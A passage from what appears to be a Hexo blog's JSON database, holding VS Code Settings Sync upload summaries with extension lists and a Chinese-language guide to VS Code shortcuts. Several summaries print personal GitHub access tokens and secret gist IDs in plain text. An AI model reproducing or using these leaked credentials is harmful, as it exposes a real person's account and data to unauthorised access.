Removed:</p>\n<p>Extensions Added: \\<br>  Angular2 v6.0.0 \\<br>  background v1.1.17 \\<br>  beautify v1.3.0 \\<br>  bracket-pair-colorizer v1.0.48 \\<br>  code-gnu-global v0.2.2 \\<br>  code-settings-sync v2.9.2 \\<br>  cpptools v0.17.0 \\<br>  ejs-language-support v0.0.1 \\<br>  ejs-snippets v0.1.0 \\<br>  git-project-manager v1.5.1 \\<br>  githistory v0.4.0 \\<br>  gitlens v8.2.4 \\<br>  html-snippets v0.2.1 \\<br>  java v0.24.0 \\<br>  javascript-ejs-support v0.3.2 \\<br>  JavaScriptSnippets v1.6.0 \\<br>  jquerysnippets v0.0.1 \\<br>  language-stylus v1.9.2 \\<br>  mongoose-os-ide v0.3.0 \\<br>  mssql v1.3.1 \\<br>  node-module-intellisense v1.5.0 \\<br>  npm-intellisense v1.3.0 \\<br>  python v2018.4.0 \\<br>  tslint v1.0.28 \\<br>  vetur v0.11.7 \\<br>  view-in-browser v0.0.5 \\<br>  vscode-eslint v1.4.8 \\<br>  vscode-great-icons v2.1.31 \\<br>  vscode-html-css v0.2.0 \\<br>  vscode-icons v7.23.0 \\<br>  vscode-java-debug v0.9.0 \\<br>  vscode-language-babel v0.0.14 \\<br>  vscode-language-pack-zh-hans v1.23.4 \\<br>  vscode-map-preview v0.4.2 \\<br>  vscode-maven v0.7.0 \\<br>  vscode-mongodb v0.0.2 \\<br>  vscode-npm-script v0.3.4 \\<br>  vscode-preview-server v1.0.1 \\<br>  vue-vscode-snippets v1.3.0 \\<br>  weex v0.4.0 \\<br>  xml v1.9.2</p>\n<hr>\n<p>Done.</p>\n<hr>\n<h2 id=\"2018年5月23日-14-37-12\"><a href=\"#2018年5月23日-14-37-12\" class=\"headerlink\" title=\"2018年5月23日 14:37:12\"></a>2018年5月23日 14:37:12</h2><p>CODE SETTINGS SYNC UPLOAD SUMMARY</p>\n<p>Version: 2.9.2</p>\n<hr>\n<p>GitHub Token: <strong>c49d7c88a2236d998b043830034a10d1b00ca5df</strong></p>\n<p><strong>GitHub Gist: daeb8021fc8862ba3a1fe162cc301c7c</strong></p>\n<p>GitHub Gist Type: Secret</p>\n<p>Restarting Visual Studio Code may be required to apply color and file icon theme.</p>\n<hr>\n<p>Files Uploaded:</p>\n<p>  javascript.json &gt; snippets|javascript.json</p>\n<p>  Extensions Removed:</p>\n<p>Extensions Added:\\<br>  Angular2 v6.1.1\\<br>  background v1.1.17\\<br>  beautify v1.3.0\\<br>  bracket-pair-colorizer v1.0.53\\<br>  code-gnu-global v0.2.2\\<br>  code-settings-sync v2.9.2\\<br>  cpptools v0.17.3\\<br>  ejs-language-support v0.0.1\\<br>  ejs-snippets v0.1.0\\<br>  git-project-manager v1.6.1\\<br>  githistory v0.4.1\\<br>  gitlens v8.3.2\\<br>  html-snippets v0.2.1\\<br>  java v0.25.0\\<br>  javascript-ejs-support v0.3.2\\<br>  JavaScriptSnippets v1.6.0\\<br>  jquerysnippets v0.0.1\\<br>  language-stylus v1.9.2\\<br>  mongoose-os-ide v0.3.0\\<br>  mssql v1.3.1\\<br>  node-module-intellisense v1.5.0\\<br>  npm-intellisense v1.3.0\\<br>  python v2018.4.0\\<br>  tslint v1.0.29\\<br>  vetur v0.12.3\\<br>  view-in-browser v0.0.5\\<br>  vscode-eslint v1.4.10\\<br>  vscode-great-icons v2.1.32\\<br>  vscode-html-css v0.2.0\\<br>  vscode-icons v7.23.0\\<br>  vscode-java-debug v0.9.0\\<br>  vscode-language-babel v0.0.14\\<br>  vscode-language-pack-zh-hans v1.23.5\\<br>  vscode-map-preview v0.4.2\\<br>  vscode-maven v0.8.0\\<br>  vscode-mongodb v0.0.2\\<br>  vscode-npm-script v0.3.4\\<br>  vscode-preview-server v1.0.1\\<br>  vue-vscode-snippets v1.3.0\\<br>  weex v0.4.0\\<br>  xml v1.9.2</p>\n<hr>\n<p>Done.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>CODE SETTINGS SYNC UPLOAD SUMMARY</p>\n<p>Version: 2.9.2</p>\n<hr>\n<p>GitHub Token: a445a630bcdbb6a32670317533c559de9533d8f3</p>\n<p>GitHub Gist: 12d91e8460e10f3c9083b82a25623363</p>\n<p>GitHub Gist Type: Secret</p>\n<p>Restarting Visual Studio Code may be required to apply color and file icon theme.</p>\n<hr>\n<p>Files Uploaded:</p>\n<p>  javascript.json &gt; snippets | javascript.json</p>\n<p>  Extensions Removed:</p>\n<p>Extensions Added: \\<br>  Angular2 v6.0.0 \\<br>  background v1.1.17 \\<br>  beautify v1.3.0 \\<br>  bracket-pair-colorizer v1.0.48 \\<br>  code-gnu-global v0.2.2 \\<br>  code-settings-sync v2.9.2 \\<br>  cpptools v0.17.0 \\<br>  ejs-language-support v0.0.1 \\<br>  ejs-snippets v0.1.0 \\<br>  git-project-manager v1.5.1 \\<br>  githistory v0.4.0 \\<br>  gitlens v8.2.4 \\<br>  html-snippets v0.2.1 \\<br>  java v0.24.0 \\<br>  javascript-ejs-support v0.3.2 \\<br>  JavaScriptSnippets v1.6.0 \\<br>  jquerysnippets v0.0.1 \\<br>  language-stylus v1.9.2 \\<br>  mongoose-os-ide v0.3.0 \\<br>  mssql v1.3.1 \\<br>  node-module-intellisense v1.5.0 \\<br>  npm-intellisense v1.3.0 \\<br>  python v2018.4.0 \\<br>  tslint v1.0.28 \\<br>  vetur v0.11.7 \\<br>  view-in-browser v0.0.5 \\<br>  vscode-eslint v1.4.8 \\<br>  vscode-great-icons v2.1.31 \\<br>  vscode-html-css v0.2.0 \\<br>  vscode-icons v7.23.0 \\<br>  vscode-java-debug v0.9.0 \\<br>  vscode-language-babel v0.0.14 \\<br>  vscode-language-pack-zh-hans v1.23.4 \\<br>  vscode-map-preview v0.4.2 \\<br>  vscode-maven v0.7.0 \\<br>  vscode-mongodb v0.0.2 \\<br>  vscode-npm-script v0.3.4 \\<br>  vscode-preview-server v1.0.1 \\<br>  vue-vscode-snippets v1.3.0 \\<br>  weex v0.4.0 \\<br>  xml v1.9.2</p>\n<hr>\n<p>Done.</p>\n<hr>\n<h2 id=\"2018年5月23日-14-37-12\"><a href=\"#2018年5月23日-14-37-12\" class=\"headerlink\" title=\"2018年5月23日 14:37:12\"></a>2018年5月23日 14:37:12</h2><p>CODE SETTINGS SYNC UPLOAD SUMMARY</p>\n<p>Version: 2.9.2</p>\n<hr>\n<p>GitHub Token: <strong>c49d7c88a2236d998b043830034a10d1b00ca5df</strong></p>\n<p><strong>GitHub Gist: daeb8021fc8862ba3a1fe162cc301c7c</strong></p>\n<p>GitHub Gist Type: Secret</p>\n<p>Restarting Visual Studio Code may be required to apply color and file icon theme.</p>\n<hr>\n<p>Files Uploaded:</p>\n<p>  javascript.json &gt; snippets|javascript.json</p>\n<p>  Extensions Removed:</p>\n<p>Extensions Added:\\<br>  Angular2 v6.1.1\\<br>  background v1.1.17\\<br>  beautify v1.3.0\\<br>  bracket-pair-colorizer v1.0.53\\<br>  code-gnu-global v0.2.2\\<br>  code-settings-sync v2.9.2\\<br>  cpptools v0.17.3\\<br>  ejs-language-support v0.0.1\\<br>  ejs-snippets v0.1.0\\<br>  git-project-manager v1.6.1\\<br>  githistory v0.4.1\\<br>  gitlens v8.3.2\\<br>  html-snippets v0.2.1\\<br>  java v0.25.0\\<br>  javascript-ejs-support v0.3.2\\<br>  JavaScriptSnippets v1.6.0\\<br>  jquerysnippets v0.0.1\\<br>  language-stylus v1.9.2\\<br>  mongoose-os-ide v0.3.0\\<br>  mssql v1.3.1\\<br>  node-module-intellisense v1.5.0\\<br>  npm-intellisense v1.3.0\\<br>  python v2018.4.0\\<br>  tslint v1.0.29\\<br>  vetur v0.12.3\\<br>  view-in-browser v0.0.5\\<br>  vscode-eslint v1.4.10\\<br>  vscode-great-icons v2.1.32\\<br>  vscode-html-css v0.2.0\\<br>  vscode-icons v7.23.0\\<br>  vscode-java-debug v0.9.0\\<br>  vscode-language-babel v0.0.14\\<br>  vscode-language-pack-zh-hans v1.23.5\\<br>  vscode-map-preview v0.4.2\\<br>  vscode-maven v0.8.0\\<br>  vscode-mongodb v0.0.2\\<br>  vscode-npm-script v0.3.4\\<br>  vscode-preview-server v1.0.1\\<br>  vue-vscode-snippets v1.3.0\\<br>  weex v0.4.0\\<br>  xml v1.9.2</p>\n<hr>\n<p>Done.</p>\n"},{"title":"VSCode使用笔记","date":"2017-01-16T07:29:53.000Z","archives":"Editer","_content":"## **发现**\n> ### 新建终端\n> `ctrl`+`shift`+`~`\n\n> ### 选择使用空格缩进并配置\n> `ctrl`+`k` `j`\n\n> ### 跳转行\n> `ctrl`+`g`\n\n  \n\n## **演练场**<br/>\n+ **Multi-Cursor Editing(多光标编辑)**<br/>\n  1. 框选择-按下`Ctrl+Shift+Alt+下箭头键`,`Ctrl+Shift+Alt+右转`,`Ctrl+Shift+Alt+UpArrow`,` Ctrl+Shift+Alt+LeftArrow`选择一个文本块,你也可以按住`Shift+Alt`,选择鼠标文本。\n  2. 添加一个光标-按`Ctrl+Alt+UpArrow`或`Ctrl+Alt+向下箭头`,在上面或下面添加一个新的游标,你也可以用Ctrl+Click来在任何地方添加光标。\n  3. 创建游标上出现的所有字符串的字符串-选择一个实例例如背景颜色和媒体未绑定。现在您可以通过简单地输入来替换所有实例。<br/>\n\n+ **IntelliSense(智能提示)**<br/>\n  + Alt+Z/Alt+X\n\n+ **Line Actions(行操作)**\n  1. 复制一条线,并将其插入到当前位置的上方或下方,分别使用Shift+Alt+向下箭头或Shift+Alt+UpArrow。\n  2. 用Alt+UpArrow和Alt+向下箭头移动整行或选择行。\n  3. 用Ctrl+Shift+K删除整个行。<br/><br/>\n  + 提示:另一个非常常见的任务是注释掉一个代码块——您可以通过按`Ctrl+/`来切换注释。\n+ **Rename Refactoring(更名重构)**<br/>\n  + 可以很容易地重命名一个符号,例如`函数名`或`变量名`。在`符号`\"Book(例子)\"中按`F2`重命名所有实例——这将发生在项目中的所有文件中。您还可以在右键单击上下文菜单中看到重构。\n  + `JSDoc`提示:上面的示例还展示了通过使用`JSDoc`注释获得智能感知提示的另一种方法。您可以通过调用Book函数并查看功能和参数的智能感知体验中增强的上下文来尝试这一点。\n\n+ **Refactoring via Extraction(!通过提取重构)**\n  + 有时候,您希望将已经`编写好的代码`添加到一个`单独的函数`中,或者稍后再使用它。选择要提取的行并按`Ctrl+.`或者点击这个小灯泡,选择其中的一个提取到……选项。通过在第3行或任何其他您想要提出的通用代码中选择if-子句中的代码来尝试它。\n\n+ **Formatting(格式化)**\n  + 如果没有良好的格式化程序,让代码看起来很棒是很困难的。幸运的是,使用`Shift+Alt+F`或格式化的整个文档可以用`Ctrl+K Ctrl+F`来应用当前的选择。这两个选项都可以通过右键单击上下文菜单获得。\n  + `Tip`: 可在扩展库中提供其他格式化程序。格式化支持也可以通过设置来配置,例如启用编辑器。\n\n+ **Code folding(代码折叠)**\n  + 在一个大的文件中,它通常可以用来折叠代码段以增加可读性。要做到这一点,你只需按`Ctrl+Shift+[`折叠代码-按`Ctrl+Shift+]`即可展开。折叠也可以用左边沟中的`+/-`图标来完成。按`Ctrl+Shift+Alt+[`或按`Ctrl+Shift+Alt+]`折叠所有部分。\n  + 提示:折叠是基于缩进的,因此可以应用于所有语言。简单地缩进你的代码来创建一个可折叠的部分,你可以用Ctrl+K Ctrl+1和Ctrl+K Ctrl+5这样的快捷方式折叠一定数量的级别。\n\n+ **Errors and Warnings(错误和警告)**\n  + 在编辑代码时,会高亮显示错误和警告。在下面的示例中,您可以看到许多语法错误。按下`F8`,你可以按顺序浏览它们,并看到详细的错误信息。当您纠正它们时,弯角和滚动条指示器将会更新。\n\n+ **Snippets(片段)**\n  + 您可以通过使用片段大大加快编辑速度。简单地开始键入尝试,从`建议列表`和按`Tab`中选择`trycatch`来创建一个`try->catch块`。您的光标将被放置在文本错误,以方便编辑。如果有多个参数存在,则按Tab键跳到它。","source":"_posts/Editor/VSCode使用笔记.md","raw":"---\ntitle: VSCode使用笔记\ndate: 2017-01-16 15:29:53\ntags: VSCode\narchives: Editer\ncategories: VSCode\n---\n## **发现**\n> ### 新建终端\n> `ctrl`+`shift`+`~`\n\n> ### 选择使用空格缩进并配置\n> `ctrl`+`k` `j`\n\n> ### 跳转行\n> `ctrl`+`g`\n\n  \n\n## **演练场**<br/>\n+ **Multi-Cursor Editing(多光标编辑)**<br/>\n  1. 框选择-按下`Ctrl+Shift+Alt+下箭头键`,`Ctrl+Shift+Alt+右转`,`Ctrl+Shift+Alt+UpArrow`,` Ctrl+Shift+Alt+LeftArrow`选择一个文本块,你也可以按住`Shift+Alt`,选择鼠标文本。\n  2. 添加一个光标-按`Ctrl+Alt+UpArrow`或`Ctrl+Alt+向下箭头`,在上面或下面添加一个新的游标,你也可以用Ctrl+Click来在任何地方添加光标。\n  3. 创建游标上出现的所有字符串的字符串-选择一个实例例如背景颜色和媒体未绑定。现在您可以通过简单地输入来替换所有实例。<br/>\n\n+ **IntelliSense(智能提示)**<br/>\n  + Alt+Z/Alt+X\n\n+ **Line Actions(行操作)**\n  1. 复制一条线,并将其插入到当前位置的上方或下方,分别使用Shift+Alt+向下箭头或Shift+Alt+UpArrow。\n  2. 用Alt+UpArrow和Alt+向下箭头移动整行或选择行。\n  3. 用Ctrl+Shift+K删除整个行。<br/><br/>\n  + 提示:另一个非常常见的任务是注释掉一个代码块——您可以通过按`Ctrl+/`来切换注释。\n+ **Rename Refactoring(更名重构)**<br/>\n  + 可以很容易地重命名一个符号,例如`函数名`或`变量名`。在`符号`\"Book(例子)\"中按`F2`重命名所有实例——这将发生在项目中的所有文件中。您还可以在右键单击上下文菜单中看到重构。\n  + `JSDoc`提示:上面的示例还展示了通过使用`JSDoc`注释获得智能感知提示的另一种方法。您可以通过调用Book函数并查看功能和参数的智能感知体验中增强的上下文来尝试这一点。\n\n+ **Refactoring via Extraction(!通过提取重构)**\n  + 有时候,您希望将已经`编写好的代码`添加到一个`单独的函数`中,或者稍后再使用它。选择要提取的行并按`Ctrl+.`或者点击这个小灯泡,选择其中的一个提取到……选项。通过在第3行或任何其他您想要提出的通用代码中选择if-子句中的代码来尝试它。\n\n+ **Formatting(格式化)**\n  + 如果没有良好的格式化程序,让代码看起来很棒是很困难的。幸运的是,使用`Shift+Alt+F`或格式化的整个文档可以用`Ctrl+K Ctrl+F`来应用当前的选择。这两个选项都可以通过右键单击上下文菜单获得。\n  + `Tip`: 可在扩展库中提供其他格式化程序。格式化支持也可以通过设置来配置,例如启用编辑器。\n\n+ **Code folding(代码折叠)**\n  + 在一个大的文件中,它通常可以用来折叠代码段以增加可读性。要做到这一点,你只需按`Ctrl+Shift+[`折叠代码-按`Ctrl+Shift+]`即可展开。折叠也可以用左边沟中的`+/-`图标来完成。按`Ctrl+Shift+Alt+[`或按`Ctrl+Shift+Alt+]`折叠所有部分。\n  + 提示:折叠是基于缩进的,因此可以应用于所有语言。简单地缩进你的代码来创建一个可折叠的部分,你可以用Ctrl+K Ctrl+1和Ctrl+K Ctrl+5这样的快捷方式折叠一定数量的级别。\n\n+ **Errors and Warnings(错误和警告)**\n  + 在编辑代码时,会高亮显示错误和警告。在下面的示例中,您可以看到许多语法错误。按下`F8`,你可以按顺序浏览它们,并看到详细的错误信息。当您纠正它们时,弯角和滚动条指示器将会更新。\n\n+ **Snippets(片段)**\n  + 您可以通过使用片段大大加快编辑速度。简单地开始键入尝试,从`建议列表`和按`Tab`中选择`trycatch`来创建一个`try->catch块`。您的光标将被放置在文本错误,以方便编辑。如果有多个参数存在,则按Tab键跳到它。","slug":"Editor/VSCode使用笔记","published":1,"updated":"2018-09-05T06:33:18.443Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxuv002rzodvdm2mwzpc","content":"<h2 id=\"发现\"><a href=\"#发现\" class=\"headerlink\" title=\"发现\"></a><strong>发现</strong></h2><blockquote>\n<h3 id=\"新建终端\"><a href=\"#新建终端\" class=\"headerlink\" title=\"新建终端\"></a>新建终端</h3><p><code>ctrl</code>+<code>shift</code>+<code>~</code></p>\n<h3 id=\"选择使用空格缩进并配置\"><a href=\"#选择使用空格缩进并配置\" class=\"headerlink\" title=\"选择使用空格缩进并配置\"></a>选择使用空格缩进并配置</h3><p><code>ctrl</code>+<code>k</code> <code>j</code></p>\n<h3 id=\"跳转行\"><a href=\"#跳转行\" class=\"headerlink\" title=\"跳转行\"></a>跳转行</h3><p><code>ctrl</code>+<code>g</code></p>\n</blockquote>\n<h2 id=\"演练场\"><a href=\"#演练场\" class=\"headerlink\" title=\"演练场\"></a><strong>演练场</strong><br></h2><ul>\n<li><p><strong>Multi-Cursor Editing(多光标编辑)</strong><br></p>\n<ol>\n<li>框选择-按下<code>Ctrl+Shift+Alt+下箭头键</code>,<code>Ctrl+Shift+Alt+右转</code>,<code>Ctrl+Shift+Alt+UpArrow</code>,<code>Ctrl+Shift+Alt+LeftArrow</code>选择一个文本块,你也可以按住<code>Shift+Alt</code>,选择鼠标文本。</li>\n<li>添加一个光标-按<code>Ctrl+Alt+UpArrow</code>或<code>Ctrl+Alt+向下箭头</code>,在上面或下面添加一个新的游标,你也可以用Ctrl+Click来在任何地方添加光标。</li>\n<li>创建游标上出现的所有字符串的字符串-选择一个实例例如背景颜色和媒体未绑定。现在您可以通过简单地输入来替换所有实例。<br></li>\n</ol>\n</li>\n<li><p><strong>IntelliSense(智能提示)</strong><br></p>\n<ul>\n<li>Alt+Z/Alt+X</li>\n</ul>\n</li>\n<li><p><strong>Line Actions(行操作)</strong></p>\n<ol>\n<li>复制一条线,并将其插入到当前位置的上方或下方,分别使用Shift+Alt+向下箭头或Shift+Alt+UpArrow。</li>\n<li>用Alt+UpArrow和Alt+向下箭头移动整行或选择行。</li>\n<li>用Ctrl+Shift+K删除整个行。<br><br></li>\n</ol>\n<ul>\n<li>提示:另一个非常常见的任务是注释掉一个代码块——您可以通过按<code>Ctrl+/</code>来切换注释。</li>\n</ul>\n</li>\n<li><p><strong>Rename Refactoring(更名重构)</strong><br></p>\n<ul>\n<li>可以很容易地重命名一个符号,例如<code>函数名</code>或<code>变量名</code>。在<code>符号</code>“Book(例子)”中按<code>F2</code>重命名所有实例——这将发生在项目中的所有文件中。您还可以在右键单击上下文菜单中看到重构。</li>\n<li><code>JSDoc</code>提示:上面的示例还展示了通过使用<code>JSDoc</code>注释获得智能感知提示的另一种方法。您可以通过调用Book函数并查看功能和参数的智能感知体验中增强的上下文来尝试这一点。</li>\n</ul>\n</li>\n<li><p><strong>Refactoring via Extraction(!通过提取重构)</strong></p>\n<ul>\n<li>有时候,您希望将已经<code>编写好的代码</code>添加到一个<code>单独的函数</code>中,或者稍后再使用它。选择要提取的行并按<code>Ctrl+.</code>或者点击这个小灯泡,选择其中的一个提取到……选项。通过在第3行或任何其他您想要提出的通用代码中选择if-子句中的代码来尝试它。</li>\n</ul>\n</li>\n<li><p><strong>Formatting(格式化)</strong></p>\n<ul>\n<li>如果没有良好的格式化程序,让代码看起来很棒是很困难的。幸运的是,使用<code>Shift+Alt+F</code>或格式化的整个文档可以用<code>Ctrl+K Ctrl+F</code>来应用当前的选择。这两个选项都可以通过右键单击上下文菜单获得。</li>\n<li><code>Tip</code>: 可在扩展库中提供其他格式化程序。格式化支持也可以通过设置来配置,例如启用编辑器。</li>\n</ul>\n</li>\n<li><p><strong>Code folding(代码折叠)</strong></p>\n<ul>\n<li>在一个大的文件中,它通常可以用来折叠代码段以增加可读性。要做到这一点,你只需按<code>Ctrl+Shift+[</code>折叠代码-按<code>Ctrl+Shift+]</code>即可展开。折叠也可以用左边沟中的<code>+/-</code>图标来完成。按<code>Ctrl+Shift+Alt+[</code>或按<code>Ctrl+Shift+Alt+]</code>折叠所有部分。</li>\n<li>提示:折叠是基于缩进的,因此可以应用于所有语言。简单地缩进你的代码来创建一个可折叠的部分,你可以用Ctrl+K Ctrl+1和Ctrl+K Ctrl+5这样的快捷方式折叠一定数量的级别。</li>\n</ul>\n</li>\n<li><p><strong>Errors and Warnings(错误和警告)</strong></p>\n<ul>\n<li>在编辑代码时,会高亮显示错误和警告。在下面的示例中,您可以看到许多语法错误。按下<code>F8</code>,你可以按顺序浏览它们,并看到详细的错误信息。当您纠正它们时,弯角和滚动条指示器将会更新。</li>\n</ul>\n</li>\n<li><p><strong>Snippets(片段)</strong></p>\n<ul>\n<li>您可以通过使用片段大大加快编辑速度。简单地开始键入尝试,从<code>建议列表</code>和按<code>Tab</code>中选择<code>trycatch</code>来创建一个<code>try-&gt;catch块</code>。您的光标将被放置在文本错误,以方便编辑。如果有多个参数存在,则按Tab键跳到它。</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"发现\"><a href=\"#发现\" class=\"headerlink\" title=\"发现\"></a><strong>发现</strong></h2><blockquote>\n<h3 id=\"新建终端\"><a href=\"#新建终端\" class=\"headerlink\" title=\"新建终端\"></a>新建终端</h3><p><code>ctrl</code>+<code>shift</code>+<code>~</code></p>\n<h3 id=\"选择使用空格缩进并配置\"><a href=\"#选择使用空格缩进并配置\" class=\"headerlink\" title=\"选择使用空格缩进并配置\"></a>选择使用空格缩进并配置</h3><p><code>ctrl</code>+<code>k</code> <code>j</code></p>\n<h3 id=\"跳转行\"><a href=\"#跳转行\" class=\"headerlink\" title=\"跳转行\"></a>跳转行</h3><p><code>ctrl</code>+<code>g</code></p>\n</blockquote>\n<h2 id=\"演练场\"><a href=\"#演练场\" class=\"headerlink\" title=\"演练场\"></a><strong>演练场</strong><br></h2><ul>\n<li><p><strong>Multi-Cursor Editing(多光标编辑)</strong><br></p>\n<ol>\n<li>框选择-按下<code>Ctrl+Shift+Alt+下箭头键</code>,<code>Ctrl+Shift+Alt+右转</code>,<code>Ctrl+Shift+Alt+UpArrow</code>,<code>Ctrl+Shift+Alt+LeftArrow</code>选择一个文本块,你也可以按住<code>Shift+Alt</code>,选择鼠标文本。</li>\n<li>添加一个光标-按<code>Ctrl+Alt+UpArrow</code>或<code>Ctrl+Alt+向下箭头</code>,在上面或下面添加一个新的游标,你也可以用Ctrl+Click来在任何地方添加光标。</li>\n<li>创建游标上出现的所有字符串的字符串-选择一个实例例如背景颜色和媒体未绑定。现在您可以通过简单地输入来替换所有实例。<br></li>\n</ol>\n</li>\n<li><p><strong>IntelliSense(智能提示)</strong><br></p>\n<ul>\n<li>Alt+Z/Alt+X</li>\n</ul>\n</li>\n<li><p><strong>Line Actions(行操作)</strong></p>\n<ol>\n<li>复制一条线,并将其插入到当前位置的上方或下方,分别使用Shift+Alt+向下箭头或Shift+Alt+UpArrow。</li>\n<li>用Alt+UpArrow和Alt+向下箭头移动整行或选择行。</li>\n<li>用Ctrl+Shift+K删除整个行。<br><br></li>\n</ol>\n<ul>\n<li>提示:另一个非常常见的任务是注释掉一个代码块——您可以通过按<code>Ctrl+/</code>来切换注释。</li>\n</ul>\n</li>\n<li><p><strong>Rename Refactoring(更名重构)</strong><br></p>\n<ul>\n<li>可以很容易地重命名一个符号,例如<code>函数名</code>或<code>变量名</code>。在<code>符号</code>“Book(例子)”中按<code>F2</code>重命名所有实例——这将发生在项目中的所有文件中。您还可以在右键单击上下文菜单中看到重构。</li>\n<li><code>JSDoc</code>提示:上面的示例还展示了通过使用<code>JSDoc</code>注释获得智能感知提示的另一种方法。您可以通过调用Book函数并查看功能和参数的智能感知体验中增强的上下文来尝试这一点。</li>\n</ul>\n</li>\n<li><p><strong>Refactoring via Extraction(!通过提取重构)</strong></p>\n<ul>\n<li>有时候,您希望将已经<code>编写好的代码</code>添加到一个<code>单独的函数</code>中,或者稍后再使用它。选择要提取的行并按<code>Ctrl+.</code>或者点击这个小灯泡,选择其中的一个提取到……选项。通过在第3行或任何其他您想要提出的通用代码中选择if-子句中的代码来尝试它。</li>\n</ul>\n</li>\n<li><p><strong>Formatting(格式化)</strong></p>\n<ul>\n<li>如果没有良好的格式化程序,让代码看起来很棒是很困难的。幸运的是,使用<code>Shift+Alt+F</code>或格式化的整个文档可以用<code>Ctrl+K Ctrl+F</code>来应用当前的选择。这两个选项都可以通过右键单击上下文菜单获得。</li>\n<li><code>Tip</code>: 可在扩展库中提供其他格式化程序。格式化支持也可以通过设置来配置,例如启用编辑器。</li>\n</ul>\n</li>\n<li><p><strong>Code folding(代码折叠)</strong></p>\n<ul>\n<li>在一个大的文件中,它通常可以用来折叠代码段以增加可读性。要做到这一点,你只需按<code>Ctrl+Shift+[</code>折叠代码-按<code>Ctrl+Shift+]</code>即可展开。折叠也可以用左边沟中的<code>+/-</code>图标来完成。按<code>Ctrl+Shift+Alt+[</code>或按<code>Ctrl+Shift+Alt+]</code>折叠所有部分。</li>\n<li>提示:折叠是基于缩进的,因此可以应用于所有语言。简单地缩进你的代码来创建一个可折叠的部分,你可以用Ctrl+K Ctrl+1和Ctrl+K Ctrl+5这样的快捷方式折叠一定数量的级别。</li>\n</ul>\n</li>\n<li><p><strong>Errors and Warnings(错误和警告)</strong></p>\n<ul>\n<li>在编辑代码时,会高亮显示错误和警告。在下面的示例中,您可以看到许多语法错误。按下<code>F8</code>,你可以按顺序浏览它们,并看到详细的错误信息。当您纠正它们时,弯角和滚动条指示器将会更新。</li>\n</ul>\n</li>\n<li><p><strong>Snippets(片段)</strong></p>\n<ul>\n<li>您可以通过使用片段大大加快编辑速度。简单地开始键入尝试,从<code>建议列表</code>和按<code>Tab</code>中选择<code>trycatch</code>来创建一个<code>try-&gt;catch块</code>。您的光标将被放置在文本错误,以方便编辑。如果有多个参数存在,则按Tab键跳到它。</li>\n</ul>\n</li>\n</ul>\n"},{"title":"编辑器配置","date":"2018-08-15T01:53:26.000Z","_content":"CODE SETTINGS SYNC UPLOAD SUMMARY\nVersion: 3.0.0\n--------------------\nGitHub Token: c875cc3b573265d55bdbe57a23d554ce9e83cde2\nGitHub Gist: daeb8021fc8862ba3a1fe162cc301c7c\nGitHub Gist Type: Secret\n\nRestarting Visual Studio Code may be required to apply color and file icon theme.\n--------------------\nFiles Uploaded:\n  javascript.json > snippets|javascript.json\n\nExtensions Ignored:\n  No extensions ignored.\n\nExtensions Removed:\n  No extensions removed.\n\nExtensions Added:\n  Angular2 v6.1.5\n  background v1.1.19\n  beautify v1.3.2\n  bracket-pair-colorizer v1.0.59\n  code-gnu-global v0.2.2\n  code-settings-sync v3.0.0\n  cpptools v0.17.7\n  ejs-language-support v0.0.1\n  ejs-snippets v0.1.0\n  git-project-manager v1.6.1\n  githistory v0.4.2\n  gitlens v8.5.4\n  html-snippets v0.2.1\n  java v0.29.0\n  javascript-ejs-support v0.3.2\n  JavaScriptSnippets v1.7.0\n  jquerysnippets v0.0.1\n  language-stylus v1.9.2\n  markdown-all-in-one v1.6.0\n  mongoose-os-ide v0.3.0\n  mssql v1.4.0\n  node-module-intellisense v1.5.0\n  npm-intellisense v1.3.0\n  python v2018.7.1\n  Theme-MarkdownKit v0.1.4\n  tslint v1.0.34\n  vetur v0.12.6\n  view-in-browser v0.0.5\n  vscode-eslint v1.4.12\n  vscode-great-icons v2.1.41\n  vscode-html-css v0.2.0\n  vscode-icons v7.25.0\n  vscode-java-debug v0.11.0\n  vscode-language-babel v0.0.20\n  vscode-language-pack-zh-hans v1.25.3\n  vscode-map-preview v0.4.2\n  vscode-maven v0.10.0\n  vscode-mongodb v0.0.2\n  vscode-npm-script v0.3.5\n  vscode-preview-server v1.0.1\n  vue-vscode-snippets v1.3.0\n  weex v0.4.0\n  xml v2.3.1\n--------------------\nDone.","source":"_posts/Editor/编辑器配置.md","raw":"---\ntitle: 编辑器配置\ndate: 2018-08-15 09:53:26\ntags:\ncategories: edit\n---\nCODE SETTINGS SYNC UPLOAD SUMMARY\nVersion: 3.0.0\n--------------------\nGitHub Token: c875cc3b573265d55bdbe57a23d554ce9e83cde2\nGitHub Gist: daeb8021fc8862ba3a1fe162cc301c7c\nGitHub Gist Type: Secret\n\nRestarting Visual Studio Code may be required to apply color and file icon theme.\n--------------------\nFiles Uploaded:\n  javascript.json > snippets|javascript.json\n\nExtensions Ignored:\n  No extensions ignored.\n\nExtensions Removed:\n  No extensions removed.\n\nExtensions Added:\n  Angular2 v6.1.5\n  background v1.1.19\n  beautify v1.3.2\n  bracket-pair-colorizer v1.0.59\n  code-gnu-global v0.2.2\n  code-settings-sync v3.0.0\n  cpptools v0.17.7\n  ejs-language-support v0.0.1\n  ejs-snippets v0.1.0\n  git-project-manager v1.6.1\n  githistory v0.4.2\n  gitlens v8.5.4\n  html-snippets v0.2.1\n  java v0.29.0\n  javascript-ejs-support v0.3.2\n  JavaScriptSnippets v1.7.0\n  jquerysnippets v0.0.1\n  language-stylus v1.9.2\n  markdown-all-in-one v1.6.0\n  mongoose-os-ide v0.3.0\n  mssql v1.4.0\n  node-module-intellisense v1.5.0\n  npm-intellisense v1.3.0\n  python v2018.7.1\n  Theme-MarkdownKit v0.1.4\n  tslint v1.0.34\n  vetur v0.12.6\n  view-in-browser v0.0.5\n  vscode-eslint v1.4.12\n  vscode-great-icons v2.1.41\n  vscode-html-css v0.2.0\n  vscode-icons v7.25.0\n  vscode-java-debug v0.11.0\n  vscode-language-babel v0.0.20\n  vscode-language-pack-zh-hans v1.25.3\n  vscode-map-preview v0.4.2\n  vscode-maven v0.10.0\n  vscode-mongodb v0.0.2\n  vscode-npm-script v0.3.5\n  vscode-preview-server v1.0.1\n  vue-vscode-snippets v1.3.0\n  weex v0.4.0\n  xml v2.3.1\n--------------------\nDone.","slug":"Editor/编辑器配置","published":1,"updated":"2018-09-05T06:33:18.444Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxuy002vzodv6gigwx0b","content":"<p>CODE SETTINGS SYNC UPLOAD SUMMARY</p>\n<h2 id=\"Version-3-0-0\"><a 